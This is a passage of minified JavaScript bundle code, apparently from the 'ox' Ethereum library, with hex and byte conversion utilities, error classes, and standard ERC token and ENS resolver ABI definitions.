CC;lQ=1,Object.defineProperty(CC,"__esModule",{value:!0}),CC.decodeFunctionResult=i;const t=$r(),e=s0(),n=Qf(),r="/docs/contract/decodeFunctionResult";function i(s){const{abi:o,args:a,functionName:c,data:l}=s;let f=o[0];if(c){const m=(0,n.getAbiItem)({abi:o,args:a,name:c});if(!m)throw new t.AbiFunctionNotFoundError(c,{docsPath:r});f=m}if(f.type!=="function")throw new t.AbiFunctionNotFoundError(void 0,{docsPath:r});if(!f.outputs)throw new t.AbiFunctionOutputsNotFoundError(f.name,{docsPath:r});const h=(0,e.decodeAbiParameters)(f.outputs,l);if(h&&h.length>1)return h;if(h&&h.length===1)return h[0]}return CC}var E2={},_2={},en={},wn={},A2={},Cb={},C2={},dQ;function $Fe(){return dQ||(dQ=1,Object.defineProperty(C2,"__esModule",{value:!0}),C2.version=void 0,C2.version="0.1.1"),C2}var fQ;function HFe(){if(fQ)return Cb;fQ=1,Object.defineProperty(Cb,"__esModule",{value:!0}),Cb.getUrl=e,Cb.getVersion=n,Cb.prettyPrint=r;const t=$Fe();function e(i){return i}function n(){return t.version}function r(i){if(!i)return"";const s=Object.entries(i).map(([a,c])=>c===void 0||c===!1?null:[a,c]).filter(Boolean),o=s.reduce((a,[c])=>Math.max(a,c.length),0);return s.map(([a,c])=>`  ${`${a}:`.padEnd(o+1)}  ${c}`).join(`
`)}return Cb}var hQ;function rc(){if(hQ)return A2;hQ=1,Object.defineProperty(A2,"__esModule",{value:!0}),A2.BaseError=void 0;const t=HFe();class e extends Error{constructor(i,s={}){const o=(()=>{if(s.cause instanceof e){if(s.cause.details)return s.cause.details;if(s.cause.shortMessage)return s.cause.shortMessage}return s.cause&&"details"in s.cause&&typeof s.cause.details=="string"?s.cause.details:s.cause?.message?s.cause.message:s.details})(),a=s.cause instanceof e&&s.cause.docsPath||s.docsPath,l=`https://oxlib.sh${a??""}`,f=[i||"An error occurred.",...s.metaMessages?["",...s.metaMessages]:[],...o||a?["",o?`Details: ${o}`:void 0,a?`See: ${l}`:void 0]:[]].filter(h=>typeof h=="string").join(`
`);super(f,s.cause?{cause:s.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docs",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:`ox@${(0,t.getVersion)()}`}),this.cause=s.cause,this.details=o,this.docs=l,this.docsPath=a,this.shortMessage=i}walk(i){return n(this,i)}}A2.BaseError=e;function n(r,i){return i?.(r)?r:r&&typeof r=="object"&&"cause"in r&&r.cause?n(r.cause,i):i?null:r}return A2}var ek={},pQ;function Tle(){return pQ||(pQ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.charCodeMap=void 0,t.assertSize=n,t.assertStartOffset=r,t.assertEndOffset=i,t.charCodeToBase16=s,t.pad=o,t.trim=a;const e=ud();function n(c,l){if(e.size(c)>l)throw new e.SizeOverflowError({givenSize:e.size(c),maxSize:l})}function r(c,l){if(typeof l=="number"&&l>0&&l>e.size(c)-1)throw new e.SliceOffsetOutOfBoundsError({offset:l,position:"start",size:e.size(c)})}function i(c,l,f){if(typeof l=="number"&&typeof f=="number"&&e.size(c)!==f-l)throw new e.SliceOffsetOutOfBoundsError({offset:f,position:"end",size:e.size(c)})}t.charCodeMap={zero:48,nine:57,A:65,F:70,a:97,f:102};function s(c){if(c>=t.charCodeMap.zero&&c<=t.charCodeMap.nine)return c-t.charCodeMap.zero;if(c>=t.charCodeMap.A&&c<=t.charCodeMap.F)return c-(t.charCodeMap.A-10);if(c>=t.charCodeMap.a&&c<=t.charCodeMap.f)return c-(t.charCodeMap.a-10)}function o(c,l={}){const{dir:f,size:h=32}=l;if(h===0)return c;if(c.length>h)throw new e.SizeExceedsPaddingSizeError({size:c.length,targetSize:h,type:"Bytes"});const m=new Uint8Array(h);for(let b=0;b<h;b++){const w=f==="right";m[w?b:h-b-1]=c[w?b:c.length-b-1]}return m}function a(c,l={}){const{dir:f="left"}=l;let h=c,m=0;for(let b=0;b<h.length-1&&h[f==="left"?b:h.length-b-1].toString()==="0";b++)m++;return h=f==="left"?h.slice(m):h.slice(0,h.length-m),h}})(ek)),ek}var rp={},mQ;function xle(){if(mQ)return rp;mQ=1,Object.defineProperty(rp,"__esModule",{value:!0}),rp.assertSize=e,rp.assertStartOffset=n,rp.assertEndOffset=r,rp.pad=i,rp.trim=s;const t=Os();function e(o,a){if(t.size(o)>a)throw new t.SizeOverflowError({givenSize:t.size(o),maxSize:a})}function n(o,a){if(typeof a=="number"&&a>0&&a>t.size(o)-1)throw new t.SliceOffsetOutOfBoundsError({offset:a,position:"start",size:t.size(o)})}function r(o,a,c){if(typeof a=="number"&&typeof c=="number"&&t.size(o)!==c-a)throw new t.SliceOffsetOutOfBoundsError({offset:c,position:"end",size:t.size(o)})}function i(o,a={}){const{dir:c,size:l=32}=a;if(l===0)return o;const f=o.replace("0x","");if(f.length>l*2)throw new t.SizeExceedsPaddingSizeError({size:Math.ceil(f.length/2),targetSize:l,type:"Hex"});return`0x${f[c==="right"?"padEnd":"padStart"](l*2,"0")}`}function s(o,a={}){const{dir:c="left"}=a;let l=o.replace("0x",""),f=0;for(let h=0;h<l.length-1&&l[c==="left"?h:l.length-h-1].toString()==="0";h++)f++;return l=c==="left"?l.slice(f):l.slice(0,l.length-f),l==="0"?"0x":c==="right"&&l.length%2===1?`0x${l}0`:`0x${l}`}return rp}var S2={},gQ;function Y8(){if(gQ)return S2;gQ=1,Object.defineProperty(S2,"__esModule",{value:!0}),S2.parse=e,S2.stringify=n;const t="#__bigint";function e(r,i){return JSON.parse(r,(s,o)=>{const a=o;return typeof a=="string"&&a.endsWith(t)?BigInt(a.slice(0,-t.length)):typeof i=="function"?i(s,a):a})}function n(r,i,s){return JSON.stringify(r,(o,a)=>typeof i=="function"?i(o,a):typeof a=="bigint"?a.toString()+t:a,s)}return S2}var yQ;function ud(){if(yQ)return wn;yQ=1,Object.defineProperty(wn,"__esModule",{value:!0}),wn.SizeExceedsPaddingSizeError=wn.SliceOffsetOutOfBoundsError=wn.SizeOverflowError=wn.InvalidBytesTypeError=wn.InvalidBytesBooleanError=void 0,wn.assert=c,wn.concat=l,wn.from=f,wn.fromArray=h,wn.fromBoolean=m,wn.fromHex=b,wn.fromNumber=w,wn.fromString=y,wn.isEqual=E,wn.padLeft=A,wn.padRight=R,wn.random=S,wn.size=v,wn.slice=k,wn.toBigInt=O,wn.toBoolean=_,wn.toHex=I,wn.toNumber=T,wn.toString=B,wn.trimLeft=U,wn.trimRight=M,wn.validate=N;const t=cy(),e=rc(),n=Os(),r=Tle(),i=xle(),s=Y8(),o=new TextDecoder,a=new TextEncoder;function c($){if(!($ instanceof Uint8Array)){if(!$)throw new P($);if(typeof $!="object")throw new P($);if(!("BYTES_PER_ELEMENT"in $))throw new P($);if($.BYTES_PER_ELEMENT!==1||$.constructor.name!=="Uint8Array")throw new P($)}}function l(...$){let H=0;for(const V of $)H+=V.length;const L=new Uint8Array(H);for(let V=0,G=0;V<$.length;V++){const Z=$[V];L.set(Z,G),G+=Z.length}return L}function f($){return $ instanceof Uint8Array?$:typeof $=="string"?b($):h($)}function h($){return $ instanceof Uint8Array?$:new Uint8Array($)}function m($,H={}){const{size:L}=H,V=new Uint8Array(1);return V[0]=Number($),typeof L=="number"?(r.assertSize(V,L),A(V,L)):V}function b($,H={}){const{size:L}=H;let V=$;L&&(i.assertSize($,L),V=n.padRight($,L));let G=V.slice(2);G.length%2&&(G=`0${G}`);const Z=G.length/2,J=new Uint8Array(Z);for(let ne=0,re=0;ne<Z;ne++){const le=r.charCodeToBase16(G.charCodeAt(re++)),oe=r.charCodeToBase16(G.charCodeAt(re++));if(le===void 0||oe===void 0)throw new e.BaseError(`Invalid byte sequence ("${G[re-2]}${G[re-1]}" in "${G}").`);J[ne]=le*16+oe}return J}function w($,H){const L=n.fromNumber($,H);return b(L)}function y($,H={}){const{size:L}=H,V=a.encode($);return typeof L=="number"?(r.assertSize(V,L),R(V,L)):V}function E($,H){return(0,t.equalBytes)($,H)}function A($,H){return r.pad($,{dir:"left",size:H})}function R($,H){return r.pad($,{dir:"right",size:H})}function S($){return crypto.getRandomValues(new Uint8Array($))}function v($){return $.length}function k($,H,L,V={}){const{strict:G}=V;r.assertStartOffset($,H);const Z=$.slice(H,L);return G&&r.assertEndOffset(Z,H,L),Z}function O($,H={}){const{size:L}=H;typeof L<"u"&&r.assertSize($,L);const V=n.fromBytes($,H);return n.toBigInt(V,H)}function _($,H={}){const{size:L}=H;let V=$;if(typeof L<"u"&&(r.assertSize(V,L),V=U(V)),V.length>1||V[0]>1)throw new q(V);return!!V[0]}function I($,H={}){return n.fromBytes($,H)}function T($,H={}){const{size:L}=H;typeof L<"u"&&r.assertSize($,L);const V=n.fromBytes($,H);return n.toNumber(V,H)}function B($,H={}){const{size:L}=H;let V=$;return typeof L<"u"&&(r.assertSize(V,L),V=M(V)),o.decode(V)}function U($){return r.trim($,{dir:"left"})}function M($){return r.trim($,{dir:"right"})}function N($){try{return c($),!0}catch{return!1}}class q extends e.BaseError{constructor(H){super(`Bytes value \`${H}\` is not a valid boolean.`,{metaMessages:["The bytes array must contain a single byte of either a `0` or `1` value."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.InvalidBytesBooleanError"})}}wn.InvalidBytesBooleanError=q;class P extends e.BaseError{constructor(H){super(`Value \`${typeof H=="object"?s.stringify(H):H}\` of type \`${typeof H}\` is an invalid Bytes value.`,{metaMessages:["Bytes values must be of type `Bytes`."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.InvalidBytesTypeError"})}}wn.InvalidBytesTypeError=P;class C extends e.BaseError{constructor({givenSize:H,maxSize:L}){super(`Size cannot exceed \`${L}\` bytes. Given size: \`${H}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeOverflowError"})}}wn.SizeOverflowError=C;class j extends e.BaseError{constructor({offset:H,position:L,size:V}){super(`Slice ${L==="start"?"starting":"ending"} at offset \`${H}\` is out-of-bounds (size: \`${V}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SliceOffsetOutOfBoundsError"})}}wn.SliceOffsetOutOfBoundsError=j;class z extends e.BaseError{constructor({size:H,targetSize:L,type:V}){super(`${V.charAt(0).toUpperCase()}${V.slice(1).toLowerCase()} size (\`${H}\`) exceeds padding size (\`${L}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeExceedsPaddingSizeError"})}}return wn.SizeExceedsPaddingSizeError=z,wn}var bQ;function Os(){if(bQ)return en;bQ=1,Object.defineProperty(en,"__esModule",{value:!0}),en.SizeExceedsPaddingSizeError=en.SliceOffsetOutOfBoundsError=en.SizeOverflowError=en.InvalidLengthError=en.InvalidHexValueError=en.InvalidHexTypeError=en.InvalidHexBooleanError=en.IntegerOutOfRangeError=void 0,en.assert=c,en.concat=l,en.from=f,en.fromBoolean=h,en.fromBytes=m,en.fromNumber=b,en.fromString=w,en.isEqual=y,en.padLeft=E,en.padRight=A,en.random=R,en.slice=S,en.size=v,en.trimLeft=k,en.trimRight=O,en.toBigInt=_,en.toBoolean=I,en.toBytes=T,en.toNumber=B,en.toString=U,en.validate=M;const t=cy(),e=ud(),n=rc(),r=Tle(),i=xle(),s=Y8(),o=new TextEncoder,a=Array.from({length:256},(L,V)=>V.toString(16).padStart(2,"0"));function c(L,V={}){const{strict:G=!1}=V;if(!L)throw new P(L);if(typeof L!="string")throw new P(L);if(G&&!/^0x[0-9a-fA-F]*$/.test(L))throw new C(L);if(!L.startsWith("0x"))throw new C(L)}function l(...L){return`0x${L.reduce((V,G)=>V+G.replace("0x",""),"")}`}function f(L){return L instanceof Uint8Array?m(L):Array.isArray(L)?m(new Uint8Array(L)):L}function h(L,V={}){const G=`0x${Number(L)}`;return typeof V.size=="number"?(i.assertSize(G,V.size),E(G,V.size)):G}function m(L,V={}){let G="";for(let J=0;J<L.length;J++)G+=a[L[J]];const Z=`0x${G}`;return typeof V.size=="number"?(i.assertSize(Z,V.size),A(Z,V.size)):Z}function b(L,V={}){const{signed:G,size:Z}=V,J=BigInt(L);let ne;Z?G?ne=(1n<<BigInt(Z)*8n-1n)-1n:ne=2n**(BigInt(Z)*8n)-1n:typeof L=="number"&&(ne=BigInt(Number.MAX_SAFE_INTEGER));const re=typeof ne=="bigint"&&G?-ne-1n:0;if(ne&&J>ne||J<re){const ue=typeof L=="bigint"?"n":"";throw new N({max:ne?`${ne}${ue}`:void 0,min:`${re}${ue}`,signed:G,size:Z,value:`${L}${ue}`})}const oe=`0x${(G&&J<0?(1n<<BigInt(Z*8))+BigInt(J):J).toString(16)}`;return Z?E(oe,Z):oe}function w(L,V={}){return m(o.encode(L),V)}function y(L,V){return(0,t.equalBytes)(e.fromHex(L),e.fromHex(V))}function E(L,V){return i.pad(L,{dir:"left",size:V})}function A(L,V){return i.pad(L,{dir:"right",size:V})}function R(L){return m(e.random(L))}function S(L,V,G,Z={}){const{strict:J}=Z;i.assertStartOffset(L,V);const ne=`0x${L.replace("0x","").slice((V??0)*2,(G??L.length)*2)}`;return J&&i.assertEndOffset(ne,V,G),ne}function v(L){return Math.ceil((L.length-2)/2)}function k(L){return i.trim(L,{dir:"left"})}function O(L){return i.trim(L,{dir:"right"})}function _(L,V={}){const{signed:G}=V;V.size&&i.assertSize(L,V.size);const Z=BigInt(L);if(!G)return Z;const J=(L.length-2)/2,ne=(1n<<BigInt(J)*8n)-1n,re=ne>>1n;return Z<=re?Z:Z-ne-1n}function I(L,V={}){V.size&&i.assertSize(L,V.size);const G=k(L);if(G==="0x")return!1;if(G==="0x1")return!0;throw new q(L)}function T(L,V={}){return e.fromHex(L,V)}function B(L,V={}){const{signed:G,size:Z}=V;return Number(!G&&!Z?L:_(L,V))}function U(L,V={}){const{size:G}=V;let Z=e.fromHex(L);return G&&(r.assertSize(Z,G),Z=e.trimRight(Z)),new TextDecoder().decode(Z)}function M(L,V={}){const{strict:G=!1}=V;try{return c(L,{strict:G}),!0}catch{return!1}}class N extends n.BaseError{constructor({max:V,min:G,signed:Z,size:J,value:ne}){super(`Number \`${ne}\` is not in safe${J?` ${J*8}-bit`:""}${Z?" signed":" unsigned"} integer range ${V?`(\`${G}\` to \`${V}\`)`:`(above \`${G}\`)`}`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.IntegerOutOfRangeError"})}}en.IntegerOutOfRangeError=N;class q extends n.BaseError{constructor(V){super(`Hex value \`"${V}"\` is not a valid boolean.`,{metaMessages:['The hex value must be `"0x0"` (false) or `"0x1"` (true).']}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidHexBooleanError"})}}en.InvalidHexBooleanError=q;class P extends n.BaseError{constructor(V){super(`Value \`${typeof V=="object"?s.stringify(V):V}\` of type \`${typeof V}\` is an invalid hex type.`,{metaMessages:['Hex types must be represented as `"0x${string}"`.']}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidHexTypeError"})}}en.InvalidHexTypeError=P;class C extends n.BaseError{constructor(V){super(`Value \`${V}\` is an invalid hex value.`,{metaMessages:['Hex values must start with `"0x"` and contain only hexadecimal characters (0-9, a-f, A-F).']}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidHexValueError"})}}en.InvalidHexValueError=C;class j extends n.BaseError{constructor(V){super(`Hex value \`"${V}"\` is an odd length (${V.length-2} nibbles).`,{metaMessages:["It must be an even length."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.InvalidLengthError"})}}en.InvalidLengthError=j;class z extends n.BaseError{constructor({givenSize:V,maxSize:G}){super(`Size cannot exceed \`${G}\` bytes. Given size: \`${V}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeOverflowError"})}}en.SizeOverflowError=z;class $ extends n.BaseError{constructor({offset:V,position:G,size:Z}){super(`Slice ${G==="start"?"starting":"ending"} at offset \`${V}\` is out-of-bounds (size: \`${Z}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SliceOffsetOutOfBoundsError"})}}en.SliceOffsetOutOfBoundsError=$;class H extends n.BaseError{constructor({size:V,targetSize:G,type:Z}){super(`${Z.charAt(0).toUpperCase()}${Z.slice(1).toLowerCase()} size (\`${V}\`) exceeds padding size (\`${G}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeExceedsPaddingSizeError"})}}return en.SizeExceedsPaddingSizeError=H,en}var T2={},wQ;function zFe(){if(wQ)return T2;wQ=1,Object.defineProperty(T2,"__esModule",{value:!0}),T2.fromRpc=e,T2.toRpc=n;const t=Os();function e(r){return{...r,amount:BigInt(r.amount),index:Number(r.index),validatorIndex:Number(r.validatorIndex)}}function n(r){return{address:r.address,amount:t.fromNumber(r.amount),index:t.fromNumber(r.index),validatorIndex:t.fromNumber(r.validatorIndex)}}return T2}var vQ;function Ile(){if(vQ)return _2;vQ=1,Object.defineProperty(_2,"__esModule",{value:!0}),_2.fromRpc=n,_2.toRpc=r;const t=Os(),e=zFe();function n(i){return{...i.baseFeePerGas&&{baseFeePerGas:BigInt(i.baseFeePerGas)},...i.blobBaseFee&&{blobBaseFee:BigInt(i.blobBaseFee)},...i.feeRecipient&&{feeRecipient:i.feeRecipient},...i.gasLimit&&{gasLimit:BigInt(i.gasLimit)},...i.number&&{number:BigInt(i.number)},...i.prevRandao&&{prevRandao:BigInt(i.prevRandao)},...i.time&&{time:BigInt(i.time)},...i.withdrawals&&{withdrawals:i.withdrawals.map(e.fromRpc)}}}function r(i){return{...typeof i.baseFeePerGas=="bigint"&&{baseFeePerGas:t.fromNumber(i.baseFeePerGas)},...typeof i.blobBaseFee=="bigint"&&{blobBaseFee:t.fromNumber(i.blobBaseFee)},...typeof i.feeRecipient=="string"&&{feeRecipient:i.feeRecipient},...typeof i.gasLimit=="bigint"&&{gasLimit:t.fromNumber(i.gasLimit)},...typeof i.number=="bigint"&&{number:t.fromNumber(i.number)},...typeof i.prevRandao=="bigint"&&{prevRandao:t.fromNumber(i.prevRandao)},...typeof i.time=="bigint"&&{time:t.fromNumber(i.time)},...i.withdrawals&&{withdrawals:i.withdrawals.map(e.toRpc)}}}return _2}var Qn={},EQ;function f0(){if(EQ)return Qn;EQ=1,Object.defineProperty(Qn,"__esModule",{value:!0}),Qn.erc4626Abi=Qn.erc721Abi=Qn.erc1155Abi=Qn.erc20Abi_bytes32=Qn.erc20Abi=Qn.erc6492SignatureValidatorAbi=Qn.erc1271Abi=Qn.addressResolverAbi=Qn.textResolverAbi=Qn.universalResolverReverseAbi=Qn.universalResolverResolveAbi=Qn.batchGatewayAbi=Qn.multicall3Abi=void 0,Qn.multicall3Abi=[{inputs:[{components:[{name:"target",type:"address"},{name:"allowFailure",type:"bool"},{name:"callData",type:"bytes"}],name:"calls",type:"tuple[]"}],name:"aggregate3",outputs:[{components:[{name:"success",type:"bool"},{name:"returnData",type:"bytes"}],name:"returnData",type:"tuple[]"}],stateMutability:"view",type:"function"},{inputs:[],name:"getCurrentBlockTimestamp",outputs:[{internalType:"uint256",name:"timestamp",type:"uint256"}],stateMutability:"view",type:"function"}],Qn.batchGatewayAbi=[{name:"query",type:"function",stateMutability:"view",inputs:[{type:"tuple[]",name:"queries",components:[{type:"address",name:"sender"},{type:"string[]",name:"urls"},{type:"bytes",name:"data"}]}],outputs:[{type:"bool[]",name:"failures"},{type:"bytes[]",name:"responses"}]},{name:"HttpError",type:"error",inputs:[{type:"uint16",name:"status"},{type:"string",name:"message"}]}];const t=[{inputs:[{name:"dns",type:"bytes"}],name:"DNSDecodingFailed",type:"error"},{inputs:[{name:"ens",type:"string"}],name:"DNSEncodingFailed",type:"error"},{inputs:[],name:"EmptyAddress",type:"error"},{inputs:[{name:"status",type:"uint16"},{name:"message",type:"string"}],name:"HttpError",type:"error"},{inputs:[],name:"InvalidBatchGatewayResponse",type:"error"},{inputs:[{name:"errorData",type:"bytes"}],name:"ResolverError",type:"error"},{inputs:[{name:"name",type:"bytes"},{name:"resolver",type:"address"}],name:"ResolverNotContract",type:"error"},{inputs:[{name:"name",type:"bytes"}],name:"ResolverNotFound",type:"error"},{inputs:[{name:"primary",type:"string"},{name:"primaryAddress",type:"bytes"}],name:"ReverseAddressMismatch",type:"error"},{inputs:[{internalType:"bytes4",name:"selector",type:"bytes4"}],name:"UnsupportedResolverProfile",type:"error"}];return Qn.universalResolverResolveAbi=[...t,{name:"resolveWithGateways",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes"},{name:"data",type:"bytes"},{name:"gateways",type:"string[]"}],outputs:[{name:"",type:"bytes"},{name:"address",type:"address"}]}],Qn.universalResolverReverseAbi=[...t,{name:"reverseWithGateways",type:"function",stateMutability:"view",inputs:[{type:"bytes",name:"reverseName"},{type:"uint256",name:"coinType"},{type:"string[]",name:"gateways"}],outputs:[{type:"string",name:"resolvedName"},{type:"address",name:"resolver"},{type:"address",name:"reverseResolver"}]}],Qn.textResolverAbi=[{name:"text",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"key",type:"string"}],outputs:[{name:"",type:"string"}]}],Qn.addressResolverAbi=[{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"}],outputs:[{name:"",type:"address"}]},{name:"addr",type:"function",stateMutability:"view",inputs:[{name:"name",type:"bytes32"},{name:"coinType",type:"uint256"}],outputs:[{name:"",type:"bytes"}]}],Qn.erc1271Abi=[{name:"isValidSignature",type:"function",stateMutability:"view",inputs:[{name:"hash",type:"bytes32"},{name:"signature",type:"bytes"}],outputs:[{name:"",type:"bytes4"}]}],Qn.erc6492SignatureValidatorAbi=[{inputs:[{name:"_signer",type:"address"},{name:"_hash",type:"bytes32"},{name:"_signature",type:"bytes"}],stateMutability:"nonpayable",type:"constructor"},{inputs:[{name:"_signer",type:"address"},{name:"_hash",type:"bytes32"},{name:"_signature",type:"bytes"}],outputs:[{type:"bool"}],stateMutability:"nonpayable",type:"function",name:"isValidSig"}],Qn.erc20Abi=[{type:"event",name:"Approval",inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"event",name:"Transfer",inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"function",name:"allowance",stateMutability:"view",inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]},{type:"function",name:"balanceOf",stateMutability:"view",inputs:[{name:"account",type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"decimals",stateMutability:"view",inputs:[],outputs:[{type:"uint8"}]},{type:"function",name:"name",stateMutability:"view",inputs:[],outputs:[{type:"string"}]},{type:"function",name:"symbol",stateMutability:"view",inputs:[],outputs:[{type:"string"}]},{type:"function",name:"totalSupply",stateMutability:"view",inputs:[],outputs:[{type:"uint256"}]},{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}],Qn.erc20Abi_bytes32=[{type:"event",name:"Approval",inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"event",name:"Transfer",inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}]},{type:"function",name:"allowance",stateMutability:"view",inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]},{type:"function",name:"balanceOf",stateMutability:"view",inputs:[{name:"account",type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"decimals",stateMutability:"view",inputs:[],outputs:[{type:"uint8"}]},{type:"function",name:"name",stateMutability:"view",inputs:[],outputs:[{type:"bytes32"}]},{type:"function",name:"symbol",stateMutability:"view",inputs:[],outputs:[{type:"bytes32"}]},{type:"function",name:"totalSupply",stateMutability:"view",inputs:[],outputs:[{type:"uint256"}]},{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}],Qn.erc1155Abi=[{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"uint256",name:"balance",type:"uint256"},{internalType:"uint256",name:"needed",type:"uint256"},{internalType:"uint256",name:"tokenId",type:"uint256"}],name:"ERC1155InsufficientBalance",type:"error"},{inputs:[{internalType:"address",name:"approver",type:"address"}],name:"ERC1155InvalidApprover",type:"error"},{inputs:[{internalType:"uint256",name:"idsLength",type:"uint256"},{internalType:"uint256",name:"valuesLength",type:"uint256"}],name:"ERC1155InvalidArrayLength",type:"error"},{inputs:[{internalType:"address",name:"operator",type:"address"}],name:"ERC1155InvalidOperator",type:"error"},{inputs:[{internalType:"address",name:"receiver",type:"address"}],name:"ERC1155InvalidReceiver",type:"error"},{inputs:[{internalType:"address",name:"sender",type:"address"}],name:"ERC1155InvalidSender",type:"error"},{inputs:[{internalType:"address",name:"operator",type:"address"},{internalType:"address",name:"owner",type:"address"}],name:"ERC1155MissingApprovalForAll",type:"error"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"account",type:"address"},{indexed:!0,internalType:"address",name:"operator",type:"address"},{indexed:!1,internalType:"bool",name:"approved",type:"bool"}],name:"ApprovalForAll",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"operator",type:"address"},{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256[]",name:"ids",type:"uint256[]"},{indexed:!1,internalType:"uint256[]",name:"values",type:"uint256[]"}],name:"TransferBatch",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"operator",type:"address"},{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"id",type:"uint256"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"TransferSingle",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"string",name:"value",type:"string"},{indexed:!0,internalType:"uint256",name:"id",type:"uint256"}],name:"URI",type:"event"},{inputs:[{internalType:"address",name:"account",type:"address"},{internalType:"uint256",name:"id",type:"uint256"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address[]",name:"accounts",type:"address[]"},{internalType:"uint256[]",name:"ids",type:"uint256[]"}],name:"balanceOfBatch",outputs:[{internalType:"uint256[]",name:"",type:"uint256[]"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"},{internalType:"address",name:"operator",type:"address"}],name:"isApprovedForAll",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256[]",name:"ids",type:"uint256[]"},{internalType:"uint256[]",name:"values",type:"uint256[]"},{internalType:"bytes",name:"data",type:"bytes"}],name:"safeBatchTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"id",type:"uint256"},{internalType:"uint256",name:"value",type:"uint256"},{internalType:"bytes",name:"data",type:"bytes"}],name:"safeTransferFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"operator",type:"address"},{internalType:"bool",name:"approved",type:"bool"}],name:"setApprovalForAll",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"bytes4",name:"interfaceId",type:"bytes4"}],name:"supportsInterface",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"",type:"uint256"}],name:"uri",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"}],Qn.erc721Abi=[{type:"event",name:"Approval",inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!0,name:"tokenId",type:"uint256"}]},{type:"event",name:"ApprovalForAll",inputs:[{indexed:!0,